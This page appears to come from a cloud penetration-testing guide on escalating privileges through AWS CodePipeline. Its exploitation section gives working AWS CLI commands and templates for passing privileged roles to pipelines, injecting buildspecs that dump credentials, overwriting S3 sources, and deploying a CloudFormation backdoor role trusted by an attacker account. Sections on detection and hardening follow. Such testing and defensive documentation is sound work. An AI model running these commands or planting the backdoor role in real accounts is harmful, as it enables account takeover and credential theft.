---
cstg_id: CSTG-AWS-CODEPIPELINE-PRIVESC
title: "AWS Codepipeline - Privilege Escalation"
provider: aws
service: codepipeline
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - codepipeline:GetPipeline
  - codepipeline:UpdatePipeline
  - codepipeline:CreatePipeline
  - codepipeline:StartPipelineExecution
  - codepipeline:GetPipelineState
  - codepipeline:PutActionRevision
  - codepipeline:PutApprovalResult
  - codepipeline:RetryStageExecution
  - codepipeline:PollForJobs
  - codepipeline:PutJobSuccessResult
  - iam:PassRole
  - codebuild:UpdateProject
  - s3:PutObject
references:
  - https://docs.aws.amazon.com/codepipeline/latest/APIReference/Welcome.html
  - https://docs.aws.amazon.com/codepipeline/latest/userguide/security-iam.html
  - https://docs.aws.amazon.com/codepipeline/latest/userguide/how-to-custom-role.html
  - https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html
  - https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
  - https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/
  - https://docs.aws.amazon.com/codebuild/latest/userguide/security-iam.html
license: CC BY-SA 4.0
---

## Summary

CodePipeline is a powerful privilege-escalation surface because a pipeline
executes with an **IAM service role**, and individual actions invoke other
services (CodeBuild, CloudFormation, Lambda, CodeDeploy, ECS) using **roles
passed to those services**. A principal who can create or modify a pipeline -
or merely influence what code/configuration a pipeline runs - can cause those
roles to perform actions on the attacker's behalf. The effective privilege of
the attacker becomes the **union of every role the pipeline can assume or
pass**, which is frequently far broader than the attacker's own identity.

The core escalation primitives are:

1. **Role pivot via `iam:PassRole` + pipeline write.** Create or update a
   pipeline so it runs with (or passes) a more privileged role, then trigger it.
2. **Code/config injection into an existing pipeline.** Modify a source the
   pipeline trusts, or alter a CodeBuild project / buildspec / CloudFormation
   template the pipeline runs, so attacker-controlled commands execute under the
   pipeline's roles.
3. **Manual-approval bypass / stage manipulation** to push attacker-controlled
   changes through gated deploy stages.
4. **Custom action job-worker abuse** to obtain the per-action role's
   credentials.

This page enumerates the permissions that enable each path. It assumes an
assumed-breach posture (the tester already controls some principal in the
account) and builds on
[AWS CodePipeline - Enumeration](../02-services/aws-codepipeline-enum.md).

## Prerequisites

- A principal in the target account with one or more of the permissions listed
  per technique below.
- Enumeration output from the sibling page: the pipeline definitions, their
  `roleArn`s, per-action `roleArn`s, CloudFormation deploy roles, artifact
  buckets, and CodeBuild projects.
- For `PassRole`-based paths, knowledge of a target role ARN whose trust policy
  permits the relevant service principal (e.g. `codepipeline.amazonaws.com`,
  `codebuild.amazonaws.com`, `cloudformation.amazonaws.com`) to assume it.

The general precondition for the strongest paths is the classic combination
**`iam:PassRole` + a CodePipeline/CodeBuild/CloudFormation write action**. As
with all `PassRole` escalations, the value of the attack equals the privilege of
the passed role.

## Enumeration

Before exploitation, confirm which target roles can be passed and to which
service:

```bash
# Roles assumable by the relevant CI/CD service principals
for r in $(aws iam list-roles --query 'Roles[].RoleName' --output text); do
  aws iam get-role --role-name "$r" \
    --query "Role.[RoleName,AssumeRolePolicyDocument.Statement[].Principal.Service]" \
    --output text
done | grep -Ei 'codepipeline|codebuild|cloudformation'

# What does your own principal allow? (look for the PassRole + write combos)
aws iam simulate-principal-policy \
  --policy-source-arn <your-principal-arn> \
  --action-names iam:PassRole codepipeline:CreatePipeline codepipeline:UpdatePipeline \
                 codebuild:UpdateProject cloudformation:CreateStack
```

Identify the **most privileged** role that a pipeline service role or an action
can legitimately pass. That role is the escalation target.

## Misconfigurations & Findings

- Pipeline service roles with `AdministratorAccess` or broad write scopes.
- `iam:PassRole` granted with `Resource: *` (no `PassedToService` condition),
  letting a low-privilege principal hand any role to CodePipeline/CodeBuild/CFN.
- CodeBuild projects whose service role can read all of Secrets Manager / SSM,
  assume other roles, or write IAM.
- CloudFormation actions configured with `CAPABILITY_NAMED_IAM` and an admin
  deploy role.
- Source actions on mutable branches or on S3 objects the attacker can write.
- Manual approval stages that can be approved by low-privilege principals
  (`codepipeline:PutApprovalResult`).
- Custom action types whose job worker can be impersonated to harvest action
  credentials.

## Exploitation

Each subsection is keyed to the permission(s) that unlock it.

### iam:PassRole + codepipeline:CreatePipeline

If the attacker can create a pipeline and pass a privileged role to it, the
pipeline executes with that role. Use a build/invoke action that the attacker
fully controls to exfiltrate the role's credentials or take privileged actions.

```bash
# Minimal pipeline that passes a privileged role and runs an attacker-controlled
# CodeBuild action. The CodeBuild project (attacker-owned or attacker-updated)
# runs arbitrary commands under either the passed pipeline role or its own role.
cat > pipeline.json <<'JSON'
{
  "pipeline": {
    "name": "audit-pivot",
    "roleArn": "arn:aws:iam::<acct>:role/<privileged-pipeline-role>",
    "artifactStore": { "type": "S3", "location": "<artifact-bucket>" },
    "stages": [
      { "name": "Source", "actions": [{
          "name": "Src", "actionTypeId": {"category":"Source","owner":"AWS","provider":"S3","version":"1"},
          "outputArtifacts":[{"name":"src"}],
          "configuration": {"S3Bucket":"<attacker-writable-bucket>","S3ObjectKey":"src.zip","PollForSourceChanges":"false"}
      }]},
      { "name": "Build", "actions": [{
          "name": "Run", "actionTypeId": {"category":"Build","owner":"AWS","provider":"CodeBuild","version":"1"},
          "inputArtifacts":[{"name":"src"}],
          "configuration": {"ProjectName":"<attacker-controlled-project>"}
      }]}
    ]
  }
}
JSON
aws codepipeline create-pipeline --cli-input-json file://pipeline.json
aws codepipeline start-pipeline-execution --name audit-pivot
```

The action role / pipeline role credentials are reachable from inside the
CodeBuild environment via the container credential endpoint
(`$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`); a buildspec can print or exfiltrate
`sts get-caller-identity` and the temporary credentials.

### iam:PassRole + codepipeline:UpdatePipeline

If creating pipelines is restricted but an existing pipeline can be modified,
`UpdatePipeline` is equivalent: change the pipeline's `roleArn` to a more
privileged role, or insert/replace an action that runs attacker-controlled
code, then trigger it.

```bash
aws codepipeline get-pipeline --name <target> --query pipeline > p.json
# Edit p.json: set .roleArn to the privileged role and/or repoint a Build action
# at an attacker-controlled CodeBuild project, then:
aws codepipeline update-pipeline --pipeline file://p.json
aws codepipeline start-pipeline-execution --name <target>
```

### codebuild:UpdateProject (+ pipeline trigger)

If the pipeline references a CodeBuild project the attacker can update,
modifying the project's buildspec, image, or environment - or repointing it at
an attacker source - causes arbitrary commands to run under the **CodeBuild
service role** the next time the pipeline runs the build action.

```bash
aws codebuild update-project --name <project> \
  --source 'type=NO_SOURCE,buildspec=version: 0.2\nphases:\n  build:\n    commands:\n      - aws sts get-caller-identity\n      - env | grep AWS'
aws codepipeline start-pipeline-execution --name <pipeline-using-that-project>
```

This harvests the CodeBuild role's credentials and lets the attacker act with
its permissions. See the CodeBuild privilege-escalation page for buildspec
abuse details.

### Source injection (codepipeline:StartPipelineExecution / s3:PutObject / repo write)

If the attacker can write to the source the pipeline trusts - an S3 source
object, a CodeCommit branch, or an external repo branch reached via a CodeStar
connection - they control the artifact that flows downstream. A modified
buildspec or deploy template then runs under the pipeline/build/deploy roles.

```bash
# S3 source: overwrite the source artifact, then trigger
aws s3 cp malicious-src.zip s3://<source-bucket>/<source-key>
aws codepipeline start-pipeline-execution --name <pipeline>
```

This is the supply-chain variant: no IAM write is required, only write access to
a source the pipeline already trusts plus the ability to start (or wait for) an
execution.

### CloudFormation deploy action abuse (iam:PassRole to cloudformation)

If a pipeline contains a CloudFormation action that the attacker can influence
(via source/template injection) and that uses a privileged deploy role with
`CAPABILITY_NAMED_IAM`, the attacker can have CloudFormation create an IAM role
or user with `AdministratorAccess`, attach policies, or update existing roles -
all under the deploy role.

```yaml
# Injected into the template the pipeline deploys:
Resources:
  Backdoor:
    Type: AWS::IAM::Role
    Properties:
      RoleName: support-svc
      AssumeRolePolicyDocument:
        Version: '2012-10-17'
        Statement:
          - Effect: Allow
            Principal: { AWS: "arn:aws:iam::<attacker-acct>:root" }
            Action: "sts:AssumeRole"
      ManagedPolicyArns: [ "arn:aws:iam::aws:policy/AdministratorAccess" ]
```

### Manual-approval push (codepipeline:PutApprovalResult / RetryStageExecution)

A gated deploy stage protected only by a manual approval can be approved by any
principal with `PutApprovalResult` on that action, pushing an attacker-influenced
change into the protected (often production) target.

```bash
aws codepipeline put-approval-result \
  --pipeline-name <p> --stage-name <gate> --action-name <approval> \
  --result summary="approved",status="Approved" \
  --token <token-from-get-pipeline-state>
```

### Custom action job-worker impersonation (codepipeline:PollForJobs + PutJobSuccessResult)

For custom action types, a job worker polls for jobs and receives **temporary
credentials/artifact access** scoped to the action's role. A principal with
`PollForJobs` for that custom `actionTypeId` can poll, receive the job's
credentials and configuration, and act with that role.

```bash
aws codepipeline poll-for-jobs \
  --action-type-id category=Build,owner=Custom,provider=<provider>,version=1 \
  --max-batch-size 1
# Job response includes artifactCredentials and (configured) action context.
```

## Detection & Logging

All escalation paths emit **CloudTrail** management events from
`codepipeline.amazonaws.com`, `codebuild.amazonaws.com`,
`cloudformation.amazonaws.com`, and `iam.amazonaws.com`. High-signal events:

- `CreatePipeline` / `UpdatePipeline` - especially where `requestParameters`
  contain a `roleArn` change or a new/modified Build action. Correlate with a
  preceding `iam:PassRole`.
- `StartPipelineExecution`, `RetryStageExecution`, `PutActionRevision`,
  `PutApprovalResult` from unusual principals.
- `codebuild:UpdateProject` modifying `source`/`buildspec`/`environment`.
- `cloudformation:CreateStack`/`UpdateStack`/`ExecuteChangeSet` followed by
  `iam:CreateRole`/`AttachRolePolicy`/`CreateUser` performed by a CFN/deploy
  role.
- `PollForJobs` / `PutJobSuccessResult` for custom actions from unexpected
  identities.
- `s3:PutObject` to a known pipeline source object immediately before a pipeline
  execution.

Detection logic should join `iam:PassRole` events to subsequent
CodePipeline/CodeBuild/CloudFormation writes by the same principal within a short
window, and alert when a CI/CD role suddenly performs IAM writes.

## Remediation & Hardening

- Constrain `iam:PassRole`: scope to specific role ARNs and add a
  `iam:PassedToService` condition limiting the target service principal.
- Apply least privilege to pipeline, CodeBuild, and CloudFormation deploy roles;
  forbid `iam:*` on deploy roles unless strictly required, and prefer permission
  boundaries on roles that CFN may create.
- Separate duties: distinct, minimally privileged roles per stage; never reuse a
  single admin role across source, build, and deploy.
- Protect sources: immutable/locked source buckets with object-lock and tight
  bucket policies; protected branches with required reviews; avoid
  `PollForSourceChanges` on mutable branches.
- Restrict who can `CreatePipeline`/`UpdatePipeline`/`UpdateProject` and require
  change review for pipeline definitions (treat pipeline-as-code as protected
  config).
- Make manual approvals meaningful: limit `PutApprovalResult` to a small,
  audited group and require it from a separate identity than the change author.
- Use customer-managed KMS on artifact stores and scope key policies so build
  output cannot be read by unrelated principals.
- Monitor and alert on the CloudTrail joins described above.

## Tools

- **AWS CLI / SDK** (`aws codepipeline`, `aws codebuild`, `aws cloudformation`,
  `aws iam`).
- IAM policy simulation (`iam:SimulatePrincipalPolicy`) and access-graph tooling
  to discover `PassRole` and pipeline-write edges.

## References

- CodePipeline API Reference -
  https://docs.aws.amazon.com/codepipeline/latest/APIReference/Welcome.html
- CodePipeline IAM / security -
  https://docs.aws.amazon.com/codepipeline/latest/userguide/security-iam.html
- Creating a CodePipeline service role -
  https://docs.aws.amazon.com/codepipeline/latest/userguide/how-to-custom-role.html
- IAM PassRole -
  https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html
- CodeBuild IAM / security -
  https://docs.aws.amazon.com/codebuild/latest/userguide/security-iam.html
- AWS privilege escalation methods and mitigation (Rhino Security Labs) -
  https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
- AWS IAM privilege escalation (hackingthe.cloud) -
  https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/
